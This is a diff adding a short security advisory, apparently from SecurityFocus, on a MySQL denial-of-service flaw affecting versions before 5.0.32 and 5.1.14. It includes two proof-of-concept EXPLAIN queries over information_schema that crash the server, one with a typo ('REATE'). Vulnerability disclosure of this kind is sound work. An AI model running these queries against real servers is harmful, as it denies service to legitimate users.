@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/28351/info
+
+MySQL is prone to a remote denial-of-service vulnerability because it fails to handle certain specially crafted queries.
+
+An attacker can exploit this issue to crash the application, denying access to legitimate users.
+
+NOTE: An attacker must be able to execute arbitrary SELECT statements against the database to exploit this issue. This may be done through legitimate means or by exploiting other latent SQL-injection vulnerabilities.
+
+This issue affects versions prior to MySQL 5.0.32 and 5.1.14.
+
+1.
+REATE OR REPLACE VIEW test_view AS
+SELECT
+table_schema AS object_schema
+,table_name AS object_name
+,table_type AS object_type
+FROM information_schema.tables
+ORDER BY object_schema;
+
+EXPLAIN SELECT * FROM test_view;
+
+2.
+explain select * from (select table_name from information_schema.tables ) AS a;
+
